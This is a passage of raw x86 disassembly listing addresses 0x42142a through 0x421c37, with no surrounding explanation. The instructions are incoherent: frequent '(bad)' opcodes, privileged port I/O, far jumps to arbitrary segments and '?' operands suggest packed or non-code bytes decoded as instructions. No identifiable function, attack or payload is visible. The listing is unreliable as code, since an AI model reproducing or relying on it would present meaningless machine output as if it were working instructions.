  42142a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42142b:	or     eax,0x84e4390d
  421430:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  421432:	(bad)  
  421433:	icebp  
  421434:	inc    ebx
  421435:	add    ecx,ebx
  421437:	in     eax,0xe8
  421439:	jecxz  0x4213dc
  42143b:	mov    ebx,0x76c888bc
  421440:	jl     0x4214a3
  421442:	rol    ah,1
  421444:	mov    ds:0xc713ad3b,al
  421449:	xor    DWORD PTR ss:[esi],edi
  42144c:	shl    DWORD PTR [ebp+0x29],cl
  42144f:	mov    fs,WORD PTR [ebp-0x71]
  421452:	sbb    bl,ch
  421454:	gs push ds
  421456:	mov    al,0xc9
  421458:	cli    
  421459:	xchg   ebx,eax
  42145a:	or     al,0x9b
  42145c:	mov    ds:0xda60be1f,eax
  421461:	inc    ebx
  421462:	mov    bl,0xe3
  421464:	jo     0x421477
  421466:	ja     0x4213f5
  421468:	aas    
  421469:	mov    bl,0xd0
  42146b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42146c:	mov    esp,0xa072185b
  421471:	mov    eax,ds:0xa97049ab
  421476:	mov    dh,BYTE PTR [edi-0x7f5f3814]
  42147c:	cmp    BYTE PTR [eax-0xfc1287e],0xf9
  421483:	(bad)  
  421484:	nop
  421485:	scas   eax,DWORD PTR es:[edi]
  421486:	jns    0x421471
  421488:	push   ss
  421489:	(bad)  
  42148a:	add    edx,DWORD PTR fs:[ecx+0x53b0333e]
  421491:	adc    esp,DWORD PTR [edi+ecx*8+0x7960370b]
  421498:	int    0xa9
  42149a:	fsubr  QWORD PTR [ecx+0x2879824e]
  4214a0:	(bad)  
  4214a2:	dec    ebp
  4214a3:	mov    DWORD PTR [eax+0x47bfcf2f],ebx
  4214a9:	dec    ecx
  4214aa:	lods   eax,DWORD PTR ds:[esi]
  4214ab:	mov    dh,0xa1
  4214ad:	call   0x7593:0x5d63a272
  4214b4:	jbe    0x4214e8
  4214b6:	add    ah,ah
  4214b8:	xlat   BYTE PTR ds:[ebx]
  4214b9:	(bad)  
  4214ba:	(bad)  
  4214bb:	lahf   
  4214bc:	icebp  
  4214bd:	pop    esi
  4214be:	mov    ecx,ebp
  4214c0:	(bad)  
  4214c1:	fidiv  WORD PTR [edi-0x8e7b286]
  4214c7:	adc    DWORD PTR [ebp-0x58759dee],edi
  4214cd:	mov    ch,0x46
  4214cf:	and    DWORD PTR [ecx],0xd2067ec9
  4214d5:	pop    ds
  4214d6:	push   0x522ee4f2
  4214db:	enter  0x1fb,0xa4
  4214df:	adc    edx,DWORD PTR [ebx+0x2ea971eb]
  4214e5:	inc    ebx
  4214e6:	push   0x54
  4214e8:	clc    
  4214e9:	cmc    
  4214ea:	lock in al,dx
  4214ec:	dec    edx
  4214ed:	mov    ecx,0x83a6ae4a
  4214f2:	mov    eax,ds:0x4d198661
  4214f7:	and    esi,esp
  4214f9:	fidivr WORD PTR [eax]
  4214fb:	jmp    0xc635e663
  421500:	mov    edi,0x15d52b1e
  421505:	and    DWORD PTR [esi+ebp*1],0xffffffde
  421509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42150a:	inc    edi
  42150b:	push   edi
  42150c:	(bad)  
  42150d:	ins    DWORD PTR es:[edi],dx
  42150e:	mov    esi,0x9f01c2cd
  421513:	pop    es
  421514:	ret    0x2dbf
  421517:	(bad)  
  421518:	push   ds
  421519:	or     BYTE PTR [eax+0x40b223a3],ch
  42151f:	xor    bh,dh
  421521:	jmp    0x4214ad
  421523:	mov    esi,0x5a257911
  421528:	mov    dl,BYTE PTR [ebx+ecx*2]
  42152b:	jb     0x4214ec
  42152d:	fist   DWORD PTR [esi]
  42152f:	repz adc edi,edi
  421532:	les    ebx,FWORD PTR ds:0x9cf8b675
  421538:	inc    ebp
  421539:	pop    edi
  42153a:	rcr    BYTE PTR [ecx-0xba5aeaf],1
  421540:	inc    eax
  421541:	inc    ebp
  421542:	mov    al,0x13
  421544:	nop
  421545:	out    dx,eax
  421546:	mov    ah,0x98
  421548:	cmp    eax,0xbd6b5dfe
  42154d:	mov    bh,0x88
  42154f:	or     al,0x53
  421551:	stos   BYTE PTR es:[edi],al
  421552:	inc    ebx
  421553:	pusha  
  421554:	pop    es
  421555:	push   esp
  421556:	sbb    al,0xdf
  421558:	adc    al,0xb9
  42155a:	mov    ebp,0x2344d8c0
  42155f:	sub    DWORD PTR [edi-0x1bb33802],esp
  421565:	mov    dl,0xd
  421567:	pusha  
  421568:	fimul  DWORD PTR ds:0x9d1fbc5
  42156e:	rol    BYTE PTR [edx],cl
  421570:	add    al,0x7d
  421572:	xor    al,0x2a
  421574:	fs mov esp,eax
  421577:	add    dh,BYTE PTR ds:0xf03b9884
  42157d:	call   0xd7df:0x148ef070
  421584:	or     ch,BYTE PTR [edx]
  421586:	adc    al,0xe5
  421588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421589:	xchg   ebp,eax
  42158a:	xor    BYTE PTR [ecx+ecx*8+0x2e3674c5],0x8b
  421592:	sub    DWORD PTR [edi-0x11],esp
  421595:	cmp    BYTE PTR fs:[edi+esi*1],al
  421599:	mov    bh,BYTE PTR [ebx-0xfb463be]
  42159f:	push   es
  4215a0:	mov    esi,0x8c5447f9
  4215a5:	dec    ecx
  4215a6:	jae    0x421531
  4215a8:	fmul   QWORD PTR [eax-0x47]
  4215ab:	add    edi,DWORD PTR [esi]
  4215ad:	mov    DWORD PTR ds:0x222a8a0c,esi
  4215b3:	outs   dx,DWORD PTR ds:[esi]
  4215b4:	push   edi
  4215b5:	mov    eax,0xe821de72
  4215ba:	test   al,0x4
  4215bc:	jmp    0xfd8d:0x3562718a
  4215c3:	and    ax,0x4d71
  4215c7:	clc    
  4215c8:	adc    eax,0xa69cbd16
  4215cd:	out    dx,al
  4215ce:	push   esi
  4215cf:	mov    ebx,0xd87dcf1f
  4215d4:	xor    ebp,DWORD PTR [ecx+ecx*1]
  4215d7:	(bad)  
  4215d8:	ret    
  4215d9:	add    edi,DWORD PTR [edi+0x59]
  4215dc:	add    bl,ch
  4215de:	and    ebx,edx
  4215e0:	retf   
  4215e1:	call   0x1dd4927c
  4215e6:	icebp  
  4215e7:	loopne 0x421648
  4215e9:	sti    
  4215ea:	shl    DWORD PTR ds:0xd9a9f05d,1
  4215f0:	jno    0x42160a
  4215f2:	and    edx,ebp
  4215f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215f5:	fbstp  TBYTE PTR [ecx-0x3f]
  4215f8:	stos   BYTE PTR es:[edi],al
  4215f9:	cmp    BYTE PTR [edx+0x50],ch
  4215fc:	cmp    eax,0xd3f789e6
  421601:	jno    0x42160e
  421603:	add    eax,0x17f7e1dc
  421608:	cmp    BYTE PTR [edx-0x73],bl
  42160b:	jle    0x4215db
  42160d:	cld    
  42160e:	xor    edi,DWORD PTR [ebp-0x17]
  421611:	or     al,0xc9
  421613:	mov    al,ds:0x372d3040
  421618:	add    edi,edi
  42161a:	adc    eax,ebx
  42161c:	imul   ecx,DWORD PTR [esi+0x45],0x3f
  421620:	shl    DWORD PTR [edi+0x4],1
  421623:	fist   DWORD PTR [edi+0x3a53526]
  421629:	xor    bh,ch
  42162b:	jbe    0x421637
  42162d:	test   DWORD PTR [edi-0x27],ecx
  421630:	popf   
  421631:	mov    ebx,0x31032e59
  421636:	mov    edi,0x3d918a79
  42163b:	imul   edx,DWORD PTR [esi],0x2ad08311
  421641:	jmp    0x8b5f:0xf4e23dd0
  421648:	xchg   edx,eax
  421649:	cwde   
  42164a:	mov    ds:0xfb9c35f8,eax
  42164f:	mov    cl,0x89
  421651:	mov    edi,DWORD PTR [edx+0x55]
  421654:	mov    ecx,0x48f38bcc
  421659:	xor    esp,DWORD PTR [edx-0x2018223a]
  42165f:	mov    bl,0x45
  421661:	push   cs
  421662:	sub    dh,BYTE PTR [ebp-0x717b6e8d]
  421668:	addr16 std 
  42166a:	aam    0x5c
  42166c:	sub    eax,0x107d2bf8
  421671:	jb     0x4216c1
  421673:	rcr    BYTE PTR [edx+0x2f39463a],0x21
  42167a:	jbe    0x4216aa
  42167c:	cmp    bh,BYTE PTR ds:0x6de470bd
  421682:	cmp    al,0xb7
  421685:	es jmp 0xd2b6ae5e
  42168b:	scas   al,BYTE PTR es:[edi]
  42168c:	jg     0x421618
  42168e:	mov    dh,0xf8
  421690:	call   0xaf79307c
  421695:	mov    bl,ah
  421697:	scas   al,BYTE PTR es:[edi]
  421698:	ss je  0x42168d
  42169b:	mov    dl,0x6b
  42169d:	int    0x21
  42169f:	xlat   BYTE PTR ds:[ebx]
  4216a0:	add    eax,0xa287b34f
  4216a5:	ret    
  4216a6:	add    bh,ch
  4216a8:	enter  0xbeed,0x38
  4216ac:	out    0x27,eax
  4216ae:	mov    ?,WORD PTR [edx+0x4a]
  4216b1:	mov    edi,0xe6316da2
  4216b6:	sahf   
  4216b7:	int3   
  4216b8:	hlt    
  4216b9:	jg     0x4216cd
  4216bb:	sbb    eax,0xf7545aa1
  4216c0:	fnstsw WORD PTR [esi-0x258fa03c]
  4216c6:	shl    al,0x3f
  4216c9:	push   edi
  4216ca:	inc    esp
  4216cb:	inc    edx
  4216cc:	and    al,0x88
  4216ce:	cmp    esi,DWORD PTR [edx+0x4e6ec542]
  4216d4:	mov    eax,0xee814405
  4216d9:	test   DWORD PTR [edx+ebx*8],edi
  4216dc:	sbb    BYTE PTR [ebx-0xd],0xba
  4216e0:	cs sub eax,0xc4f4864e
  4216e6:	pop    edi
  4216e7:	sbb    al,0x35
  4216e9:	push   0x7e
  4216eb:	pop    ecx
  4216ec:	mov    esp,DWORD PTR [ebp-0x188f1c27]
  4216f2:	(bad)  [ebp-0x2f]
  4216f5:	sub    al,0x4e
  4216f7:	call   0xe711e9d7
  4216fc:	sbb    eax,0xa9d2915b
  421701:	js     0x42177d
  421703:	in     eax,0xa2
  421705:	nop
  421706:	jge    0x421712
  421708:	pushf  
  421709:	fnstcw WORD PTR [ebx-0x75]
  42170c:	mov    edx,0xf60e53b2
  421711:	(bad)  
  421712:	les    edx,FWORD PTR [ecx]
  421714:	adc    al,0xe2
  421716:	sbb    DWORD PTR [edi-0x76704f06],edi
  42171c:	out    0xcd,al
  42171e:	mov    ds:0x8e842174,al
  421723:	push   ebp
  421724:	jmp    0x1f48:0xcf616e37
  42172b:	sahf   
  42172c:	sti    
  42172d:	add    edx,DWORD PTR [ecx]
  42172f:	dec    esi
  421730:	mov    ecx,0x676ea487
  421735:	add    bh,BYTE PTR [eax]
  421737:	mov    edi,0x5556814
  42173c:	pop    edx
  42173d:	inc    eax
  42173e:	mov    esp,0x88c576e8
  421743:	data16 sahf 
  421745:	(bad)  
  421746:	and    eax,0xbcc0eb9
  42174b:	lock test al,0x40
  42174e:	inc    eax
  42174f:	or     eax,ecx
  421751:	push   edi
  421752:	mov    esp,DWORD PTR [edi*4+0x3ce3ca23]
  421759:	fistp  QWORD PTR [eax*1+0x3d08d0ec]
  421760:	js     0x421735
  421762:	pop    esp
  421763:	sub    DWORD PTR [ecx],esi
  421765:	add    ebp,DWORD PTR [ebx-0x32]
  421768:	popa   
  421769:	aas    
  42176a:	or     al,BYTE PTR [esi]
  42176c:	push   ebx
  42176d:	xchg   ebp,eax
  42176e:	mov    bl,0x5a
  421770:	sub    BYTE PTR [edi+0x3974ae34],bl
  421776:	cmc    
  421777:	mov    dh,0x1c
  421779:	test   al,0xe8
  42177b:	lods   al,BYTE PTR ds:[esi]
  42177c:	call   0xf3da:0x2fdc9e61
  421783:	adc    DWORD PTR [edi+0x819542],ecx
  421789:	sub    al,0xa0
  42178b:	jl     0x42172c
  42178d:	stos   BYTE PTR es:[edi],al
  42178e:	mov    ch,0x9b
  421790:	retf   0xcbf0
  421793:	and    al,0xb9
  421795:	fisub  WORD PTR [eax-0x68a5ead1]
  42179b:	idiv   DWORD PTR [esi+0x4994eadc]
  4217a1:	psubq  mm0,QWORD PTR [edi]
  4217a4:	jge    0x4217b8
  4217a6:	push   0x99b73e4e
  4217ab:	pushf  
  4217ac:	aaa    
  4217ad:	mov    al,0x94
  4217af:	loop   0x421780
  4217b1:	in     eax,0x57
  4217b3:	jae    0x42179f
  4217b5:	sbb    eax,0xbacccf2e
  4217ba:	push   0x68bc1fcf
  4217bf:	xchg   DWORD PTR [ecx],ebx
  4217c1:	mov    edx,0xc3bc829b
  4217c6:	shl    BYTE PTR [ebx],0xd
  4217c9:	jns    0x421811
  4217cb:	in     eax,0x8e
  4217cd:	lds    esp,FWORD PTR [edx-0x6861c47f]
  4217d3:	fwait
  4217d4:	xor    DWORD PTR ds:0xa785c9bc,ecx
  4217da:	div    BYTE PTR [esp+ebx*8-0x20ec37d1]
  4217e1:	lock mov ecx,0x131d3295
  4217e7:	aad    0xa4
  4217e9:	pusha  
  4217ea:	ins    BYTE PTR es:[edi],dx
  4217eb:	pop    eax
  4217ec:	pop    esp
  4217ed:	test   DWORD PTR [eax],ebx
  4217ef:	mov    dl,0x23
  4217f1:	xor    edx,DWORD PTR [eax]
  4217f3:	test   ah,ch
  4217f5:	mov    eax,0x948c34ab
  4217fa:	leave  
  4217fb:	inc    edx
  4217fc:	test   eax,0x8072be2e
  421801:	xchg   bl,bl
  421803:	lock mov edi,0x44a1b918
  421809:	pop    ecx
  42180a:	imul   eax,ecx,0xffffffd0
  42180d:	pop    edi
  42180e:	dec    edx
  42180f:	pop    es
  421810:	mov    esi,0x304b0d0a
  421815:	shr    DWORD PTR [edi],0x5c
  421818:	rcl    BYTE PTR [edx+0x24],cl
  42181b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42181c:	popf   
  42181d:	mov    bh,0x2c
  42181f:	imul   esp,DWORD PTR [ecx+0x77d0cafc],0xffffffc1
  421826:	push   ss
  421827:	hlt    
  421828:	jle    0x421802
  42182a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42182b:	sbb    al,0xf3
  42182d:	mov    dh,BYTE PTR [ecx]
  42182f:	inc    edi
  421830:	int3   
  421831:	sbb    ch,BYTE PTR [esi+eiz*4-0x622245d4]
  421838:	jns    0x42184e
  42183a:	xchg   esp,eax
  42183b:	push   ecx
  42183c:	sbb    eax,DWORD PTR [ebp+0x33867bdc]
  421842:	cmc    
  421843:	int    0x7f
  421845:	scas   eax,DWORD PTR es:[edi]
  421846:	or     al,0x5d
  421848:	dec    ecx
  421849:	fmul   DWORD PTR [esi]
  42184b:	mov    eax,ds:0x6c9435d
  421850:	sar    DWORD PTR [ebx+0x75be3466],cl
  421856:	mov    al,ds:0x56d03138
  42185b:	mov    al,BYTE PTR [eax+0x5e]
  42185e:	cs inc esi
  421860:	and    al,BYTE PTR [eax-0x53]
  421863:	mov    al,ds:0x9c74ec73
  421868:	or     esi,edx
  42186a:	stos   BYTE PTR es:[edi],al
  42186b:	push   ss
  42186c:	bound  edi,QWORD PTR [eax]
  42186e:	jmp    0x4218e3
  421870:	out    0xed,eax
  421872:	out    dx,al
  421873:	cmp    al,0x48
  421875:	fucomi st,st(7)
  421877:	aad    0xa0
  421879:	and    al,0x25
  42187b:	rcl    DWORD PTR [eax-0x34f864e7],1
  421881:	arpl   WORD PTR [ebx+0x605b1e31],bp
  421887:	xor    dh,ch
  421889:	inc    edi
  42188a:	es lock dec esp
  42188d:	cmc    
  42188e:	outs   dx,DWORD PTR ds:[esi]
  42188f:	jmp    0x2b0dc9f1
  421894:	mov    BYTE PTR ds:0xd8c62e45,al
  42189a:	mov    WORD PTR [eax],?
  42189c:	pop    es
  42189d:	sbb    dh,dh
  42189f:	mov    ebx,0xa4cd1219
  4218a4:	popa   
  4218a5:	minps  xmm5,XMMWORD PTR [ebp-0x8611c7f]
  4218ac:	mov    ebx,0x9f83ec90
  4218b1:	jecxz  0x421857
  4218b3:	fidivr WORD PTR [ebx-0x77]
  4218b6:	in     eax,0xcb
  4218b8:	mov    dl,0x8b
  4218ba:	lds    ebp,FWORD PTR [edi+0x25fb48c6]
  4218c0:	mov    ecx,0xd494ae6d
  4218c5:	jnp    0x4218ef
  4218c7:	jmp    0x4218a1
  4218c9:	mov    al,ds:0xbd4d7414
  4218ce:	int3   
  4218cf:	cdq    
  4218d0:	cmp    dl,BYTE PTR [edi-0x67c7758f]
  4218d6:	and    eax,0xb625d13e
  4218db:	fs retf 0x6ec
  4218df:	xchg   ebp,eax
  4218e0:	arpl   WORD PTR [esi],si
  4218e2:	pop    edi
  4218e3:	mov    bl,0xdf
  4218e5:	push   es
  4218e6:	push   ds
  4218e7:	popa   
  4218e8:	pop    ebp
  4218e9:	popf   
  4218ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218eb:	ret    0xa0da
  4218ee:	fnsave gs:[esi+0x7c433ee]
  4218f5:	sti    
  4218f6:	inc    eax
  4218f7:	data16 icebp 
  4218f9:	mov    esp,ebx
  4218fb:	popf   
  4218fc:	adc    edi,DWORD PTR [eax-0x67]
  4218ff:	popf   
  421900:	in     al,dx
  421901:	dec    edi
  421902:	(bad)  [ebx+0x7ca3e064]
  421908:	jmp    0xe1a8:0x705d72a3
  42190f:	out    dx,eax
  421910:	push   es
  421911:	push   ss
  421912:	jo     0x421984
  421914:	xchg   esi,eax
  421915:	pop    esp
  421916:	pop    esi
  421917:	xor    edi,eax
  421919:	jmp    0x421e2b
  42191e:	sar    DWORD PTR [edi],cl
  421920:	int3   
  421921:	int3   
  421922:	int3   
  421923:	rcl    ebx,cl
  421925:	aas    
  421926:	in     al,0x4c
  421928:	mov    bh,0x25
  42192a:	sub    DWORD PTR [ebx-0x21],0x3e
  42192e:	jno    0x42199e
  421930:	jg     0x4219aa
  421932:	jae    0x4219b0
  421934:	js     0x4219ae
  421936:	ja     0x4218fb
  421938:	mov    al,0x5e
  42193a:	push   cs
  42193b:	dec    esp
  42193c:	mov    ch,0x80
  42193e:	xor    eax,eax
  421940:	inc    esp
  421941:	push   ss
  421942:	lods   al,BYTE PTR ds:[esi]
  421943:	rcr    BYTE PTR [eax+0x7c7d359b],cl
  421949:	jg     0x4219c8
  42194b:	(bad)  
  42194c:	clc    
  42194d:	sub    al,0x75
  42194f:	mov    edi,0x9a56f558
  421954:	adc    BYTE PTR [edi-0x42],ch
  421957:	xchg   esi,ebx
  421959:	es rcl ebp,0xa8
  42195d:	mov    ds:0x1552a64a,eax
  421962:	mov    al,0x6f
  421964:	clc    
  421965:	jmp    0x421968
  421967:	inc    ebx
  421968:	stos   BYTE PTR es:[edi],al
  421969:	or     ah,BYTE PTR [esi+edx*8+0x343d77d]
  421970:	jl     0x42198a
  421972:	iret   
  421973:	fidiv  DWORD PTR [ebx-0x6d4f0e31]
  421979:	cmp    edx,DWORD PTR [edi+edx*8-0x3364997e]
  421980:	inc    ecx
  421981:	pop    ebp
  421982:	into   
  421983:	mov    ds:0x5d8837d2,eax
  421988:	jne    0x4219c9
  42198a:	pop    esp
  42198b:	push   ds
  42198c:	add    ah,BYTE PTR [edx+0xa5b67bf]
  421992:	push   edi
  421993:	xlat   BYTE PTR ds:[ebx]
  421994:	sti    
  421995:	jo     0x4219b1
  421997:	fs dec ecx
  421999:	jnp    0x421936
  42199b:	pop    esp
  42199c:	mov    eax,0x35e5acea
  4219a1:	or     BYTE PTR [esi],bl
  4219a3:	(bad)  
  4219a4:	ficomp DWORD PTR [eax+0x44f64cd8]
  4219aa:	fdiv   st(5),st
  4219ac:	ret    0x9957
  4219af:	pop    edx
  4219b0:	jmp    0xb61c:0x38673f9a
  4219b7:	jb     0x4219b4
  4219b9:	pushf  
  4219ba:	outs   dx,DWORD PTR ds:[esi]
  4219bb:	add    BYTE PTR [ecx+0x7c],bh
  4219be:	or     dl,bh
  4219c0:	add    eax,DWORD PTR [edi+0x5d]
  4219c3:	xor    eax,0x993f9ec8
  4219c8:	cmp    ch,BYTE PTR [ebx+ebp*1+0x20]
  4219cc:	test   BYTE PTR ds:[eax+0x4bca46a7],al
  4219d3:	adc    ebp,DWORD PTR [edx-0x4220b690]
  4219d9:	iret   
  4219da:	add    al,0x99
  4219dc:	or     cl,BYTE PTR [edi-0x67]
  4219df:	mov    ds:0xe5d249a9,eax
  4219e4:	leave  
  4219e5:	and    cl,bl
  4219e7:	adc    al,0xa
  4219e9:	xchg   edi,eax
  4219ea:	cmp    ch,ah
  4219ec:	sbb    bh,ch
  4219ee:	test   DWORD PTR [ecx+esi*2+0x72],esi
  4219f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219f3:	popa   
  4219f4:	push   0xf6861063
  4219f9:	in     eax,dx
  4219fa:	loop   0x4219b8
  4219fc:	dec    esp
  4219fd:	ins    DWORD PTR es:[edi],dx
  4219fe:	scas   al,BYTE PTR es:[edi]
  4219ff:	sbb    dl,bh
  421a01:	popa   
  421a02:	outs   dx,DWORD PTR ds:[esi]
  421a03:	or     ebp,edx
  421a05:	repnz mov esp,es
  421a08:	aad    0x17
  421a0a:	mov    ss,WORD PTR [ecx-0x45]
  421a0d:	nop
  421a0e:	ret    
  421a0f:	shr    DWORD PTR [eax+0x54],cl
  421a12:	icebp  
  421a13:	adc    DWORD PTR [edi+0x42],edx
  421a16:	nop
  421a17:	clc    
  421a18:	dec    ecx
  421a19:	fisttp DWORD PTR [ecx]
  421a1b:	fwait
  421a1c:	mov    ?,WORD PTR [ebx-0x2f]
  421a1f:	imul   esp,DWORD PTR [eax+0x792fd2e9],0x42
  421a26:	in     al,dx
  421a27:	test   ecx,eax
  421a29:	jecxz  0x421a7e
  421a2b:	xor    ah,BYTE PTR [edi-0x46]
  421a2e:	setg   BYTE PTR [eax]
  421a31:	dec    edx
  421a32:	mov    bh,0x33
  421a34:	jecxz  0x421a40
  421a36:	and    BYTE PTR [ecx+eax*1+0x55c49569],ah
  421a3d:	mov    ah,0x84
  421a3f:	xor    DWORD PTR [esi-0x39],esp
  421a42:	sub    BYTE PTR [ebp+ebx*8+0x78],0xb7
  421a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a48:	sub    edi,DWORD PTR [edx-0x7]
  421a4b:	adc    al,0xdc
  421a4d:	clc    
  421a4e:	neg    BYTE PTR [eax-0x1a3f645e]
  421a54:	retf   0xb210
  421a57:	adc    al,0xd
  421a59:	inc    edi
  421a5a:	dec    ebp
  421a5b:	fmulp  st(3),st
  421a5d:	repnz inc edi
  421a5f:	sub    edi,esp
  421a61:	jge    0x421a69
  421a63:	ret    0xfbbc
  421a66:	arpl   WORD PTR cs:[esi],si
  421a69:	xchg   ebx,eax
  421a6a:	fild   WORD PTR [edx+0x781f94d8]
  421a70:	in     al,dx
  421a71:	add    ebp,ebx
  421a73:	sti    
  421a74:	mov    bl,0x78
  421a76:	cmp    BYTE PTR [ebx+edx*8-0x474975fd],al
  421a7d:	inc    BYTE PTR [esi]
  421a7f:	adc    eax,DWORD PTR [edx+0x6d]
  421a82:	push   eax
  421a83:	jmp    0x421a71
  421a85:	and    ecx,esp
  421a87:	jns    0x421a89
  421a89:	lods   eax,DWORD PTR ds:[esi]
  421a8a:	push   ds
  421a8b:	repnz call 0xf830:0x44e4d13c
  421a93:	and    esp,ecx
  421a95:	shl    DWORD PTR [esi+0x5dad4114],cl
  421a9b:	push   ebx
  421a9c:	neg    BYTE PTR [edx]
  421a9e:	pop    es
  421a9f:	scas   al,BYTE PTR es:[edi]
  421aa0:	xlat   BYTE PTR ds:[ebx]
  421aa1:	cdq    
  421aa2:	or     al,0x79
  421aa4:	push   0x7017f4fd
  421aa9:	das    
  421aaa:	sub    BYTE PTR [edx+0x7b1c811],bh
  421ab0:	sahf   
  421ab1:	test   DWORD PTR [eax-0x3f9adca2],0x68616366
  421abb:	mov    dh,0x7e
  421abd:	outs   dx,BYTE PTR ds:[esi]
  421abe:	inc    eax
  421abf:	std    
  421ac0:	inc    eax
  421ac1:	ins    DWORD PTR es:[edi],dx
  421ac2:	and    DWORD PTR [ebx+ebx*1],0xffffff92
  421ac6:	pop    ds
  421ac7:	push   edx
  421ac8:	stos   BYTE PTR es:[edi],al
  421ac9:	dec    eax
  421aca:	pop    eax
  421acb:	data16 (bad) 
  421ace:	xor    dl,BYTE PTR [ebx]
  421ad0:	mov    ch,0x43
  421ad2:	push   0x6c98ec13
  421ad7:	(bad)  
  421ad8:	lods   al,BYTE PTR cs:[esi]
  421ada:	arpl   WORD PTR [esp],cx
  421add:	lds    edi,FWORD PTR [edi+0x5e]
  421ae0:	add    eax,0xdb7e92c3
  421ae5:	sbb    ah,BYTE PTR [ebp+0x582cded3]
  421aeb:	loope  0x421aee
  421aed:	dec    ebp
  421aee:	popa   
  421aef:	dec    esp
  421af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421af2:	leave  
  421af3:	fwait
  421af4:	lahf   
  421af5:	xchg   esp,eax
  421af6:	(bad)  
  421af8:	push   eax
  421af9:	sbb    eax,0xa07facb7
  421afe:	mov    WORD PTR [ebx+esi*4-0x1e1b7a88],ds
  421b05:	push   ebp
  421b06:	test   ax,0xa474
  421b0a:	mov    cl,0x87
  421b0c:	cmp    ch,BYTE PTR [esi+0x366b63d4]
  421b12:	pusha  
  421b13:	push   ds
  421b14:	cmc    
  421b15:	scas   eax,DWORD PTR es:[edi]
  421b16:	ror    DWORD PTR [ebp+0x7b],1
  421b19:	add    BYTE PTR [eax+esi*2],ah
  421b1c:	jb     0x421b0e
  421b1e:	pushf  
  421b1f:	xor    DWORD PTR [esi],0xffffffd1
  421b22:	mov    ds:0xa05ea171,al
  421b27:	fmul   st(2),st
  421b29:	xchg   ebp,eax
  421b2a:	retf   0xd6ae
  421b2d:	xchg   BYTE PTR [edx-0x34],al
  421b30:	ror    DWORD PTR [eax-0x44],0x24
  421b34:	sahf   
  421b35:	inc    esp
  421b36:	jb     0x421b93
  421b38:	mov    edx,DWORD PTR [edx+0x442ddb3c]
  421b3e:	dec    esi
  421b3f:	cld    
  421b40:	inc    ebx
  421b41:	inc    edi
  421b42:	jno    0x421b82
  421b44:	aas    
  421b45:	mov    ds:0xd34d905c,al
  421b4a:	aad    0x39
  421b4c:	jbe    0x421b8b
  421b4e:	dec    ecx
  421b4f:	mov    ds:0x955d946b,eax
  421b54:	adc    dl,BYTE PTR [eax-0x70660f37]
  421b5a:	add    al,0x97
  421b5c:	add    eax,0x123af7b7
  421b62:	aad    0x7c
  421b64:	mov    ah,dl
  421b66:	cmp    al,0xe
  421b68:	pop    edx
  421b69:	std    
  421b6a:	into   
  421b6b:	iret   
  421b6c:	push   ss
  421b6d:	out    dx,al
  421b6e:	pop    ebx
  421b6f:	(bad)  
  421b70:	imul   ebx,eax,0xa2b3d7a4
  421b76:	in     al,dx
  421b77:	loop   0x421b23
  421b79:	out    dx,al
  421b7a:	mov    edi,0xd34f8aac
  421b7f:	stc    
  421b80:	imul   ecx,DWORD PTR [esi],0xffffff9e
  421b83:	xor    ch,bh
  421b85:	ss jne 0x421b95
  421b88:	mov    bh,0x4
  421b8a:	fdiv   QWORD PTR [eax+ebx*2-0x5d]
  421b8e:	jae    0x421be4
  421b90:	add    dh,BYTE PTR [ebx+0x510344d]
  421b96:	cdq    
  421b97:	push   ecx
  421b98:	ret    0xcae
  421b9b:	xchg   ebx,eax
  421b9c:	push   ebx
  421b9d:	stc    
  421b9e:	xchg   BYTE PTR [edi],cl
  421ba0:	jecxz  0x421b62
  421ba2:	xor    al,0x9b
  421ba4:	cmp    eax,0x853e8440
  421ba9:	out    0x7d,eax
  421bab:	ins    BYTE PTR es:[edi],dx
  421bac:	call   0xf32e9e26
  421bb1:	out    dx,eax
  421bb2:	stos   DWORD PTR es:[edi],eax
  421bb3:	mov    edx,esi
  421bb5:	in     al,0x32
  421bb7:	arpl   WORD PTR [edi+ebx*8-0x4bfbfeb],bx
  421bbe:	jo     0x421c33
  421bc0:	jmp    0x421b6c
  421bc2:	mov    bh,0x4c
  421bc4:	in     al,dx
  421bc5:	xor    al,0x3e
  421bc7:	cwde   
  421bc8:	jmp    0x2761:0x61aad577
  421bcf:	std    
  421bd0:	add    eax,0xc2e7a008
  421bd5:	leave  
  421bd6:	or     al,0x26
  421bd8:	pop    ebx
  421bd9:	ret    0xa9b5
  421bdc:	into   
  421bdd:	mov    dl,0x22
  421bdf:	lds    eax,FWORD PTR [esi-0x52ca23a9]
  421be5:	retf   
  421be6:	inc    eax
  421be7:	cmp    al,BYTE PTR [ebp-0x55]
  421bea:	dec    esi
  421beb:	add    BYTE PTR [ebx+0x69],al
  421bee:	fnstenv [esi]
  421bf0:	scas   eax,DWORD PTR es:[edi]
  421bf1:	outs   dx,BYTE PTR ds:[esi]
  421bf2:	xchg   ecx,eax
  421bf3:	pushf  
  421bf4:	and    DWORD PTR [edi],esp
  421bf6:	mov    ebp,0xca6f5dd0
  421bfb:	mov    dh,0xd1
  421bfd:	fdiv   DWORD PTR [bx+si-0x669]
  421c02:	lahf   
  421c03:	jmp    0x421c7e
  421c05:	fwait
  421c06:	loop   0x421c7d
  421c08:	test   DWORD PTR [ecx+0x3d218df9],ebp
  421c0e:	test   dl,al
  421c10:	inc    ecx
  421c11:	xor    al,0xeb
  421c13:	daa    
  421c14:	paddb  mm1,mm7
  421c17:	imul   ebx,edi,0x37
  421c1a:	ror    BYTE PTR [ebx-0x3c1263ac],0xe0
  421c21:	mov    al,0x64
  421c23:	es dec edi
  421c25:	ror    DWORD PTR [esi+0x42ea4a27],cl
  421c2b:	call   FWORD PTR ds:0x7ac52e1a
  421c31:	repz jae 0x421c54
  421c34:	mov    dl,0xe1
  421c36:	outs   dx,DWORD PTR ds:[esi]
  421c37:	popf   
